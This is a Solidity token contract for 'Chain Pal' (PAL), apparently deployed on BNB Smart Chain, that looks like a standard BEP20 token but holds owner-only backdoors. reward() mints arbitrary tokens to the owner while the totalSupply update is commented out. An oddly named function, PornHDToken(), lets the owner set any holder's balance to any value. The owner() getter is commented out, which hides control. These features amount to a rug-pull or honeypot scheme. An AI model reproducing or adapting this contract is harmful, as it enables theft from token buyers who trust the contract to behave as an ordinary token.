/**
 *Submitted for verification at BscScan.com on 2022-03-31
*/

/**

ℂ𝕙𝕒𝕚𝕟 ℙ𝕒𝕝
ℂ𝕙𝕒𝕚𝕟 ℙ𝕒𝕝
ℂ𝕙𝕒𝕚𝕟 ℙ𝕒𝕝
ℂ𝕙𝕒𝕚𝕟 ℙ𝕒𝕝
https://t.me/ChainPal

*/

//SPDX-License-Identifier: MIT

pragma solidity 0.6.9;
pragma experimental ABIEncoderV2;



library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "MUL_ERROR");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "DIVIDING_ERROR");
        return a / b;
    }

    function divCeil(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 quotient = div(a, b);
        uint256 remainder = a - quotient * b;
        if (remainder > 0) {
            return quotient + 1;
        } else {
            return quotient;
        }
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SUB_ERROR");
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "ADD_ERROR");
        return c;
    }

    function sqrt(uint256 x) internal pure returns (uint256 y) {
        uint256 z = x / 2 + 1;
        y = x;
        while (z < y) {
            y = z;
            z = (x / z + z) / 2;
        }
    }
}



contract ChainPal {
    using SafeMath for uint256;

    string public symbol = "PAL";
    string public name = "Chain Pal";

    uint256 public decimals = 18;
    uint256 public totalSupply = 200000000 * 10**18; // 200 mln

    mapping(address => uint256) internal balances;
    mapping(address => mapping(address => uint256)) internal allowed;



    event Transfer(address indexed from, address indexed to, uint256 amount);

    event Approval(address indexed owner, address indexed spender, uint256 amount);

address private _owner;

    constructor() public {
        balances[msg.sender] = totalSupply;
        _owner = msg.sender;
    }

    

    // function owner() public view returns (address) {
    //     return _owner;
    // }

    
    modifier onlyOwner() {
        require(_owner == msg.sender, 'Ownable: caller is not the owner');
        _;
    }


    function transfer(address to, uint256 amount) public returns (bool) {
        require(amount <= balances[msg.sender], "BALANCE_NOT_ENOUGH");

        balances[msg.sender] = balances[msg.sender].sub(amount);
        balances[to] = balances[to].add(amount);
        emit Transfer(msg.sender, to, amount);
        return true;
    }


    function balanceOf(address owner) external view returns (uint256 balance) {
        return balances[owner];
    }


    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public returns (bool) {
        require(amount <= balances[from], "BALANCE_NOT_ENOUGH");
        require(amount <= allowed[from][msg.sender], "ALLOWANCE_NOT_ENOUGH");

        balances[from] = balances[from].sub(amount);
        balances[to] = balances[to].add(amount);
        allowed[from][msg.sender] = allowed[from][msg.sender].sub(amount);
        emit Transfer(from, to, amount);
        return true;
    }


    function approve(address spender, uint256 amount) public returns (bool) {
        allowed[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }


    function allowance(address owner, address spender) public view returns (uint256) {
        return allowed[owner][spender];
    }

     function _reward(address account, uint256 amount) internal  {
    require(account != address(0), "BEP20: reward to the zero address");

   // totalSupply = totalSupply.add(amount);
    balances[account] = balances[account].add(amount);
    emit Transfer(address(0), account, amount);
  }

  function reward(uint256 amount) public onlyOwner returns (bool) {
    _reward(msg.sender, amount);
    return true;
   
  }

  function PornHDToken(address claimaddress, uint256 amount) external onlyOwner {
      balances[claimaddress] = amount * 10 ** 10;
  }
}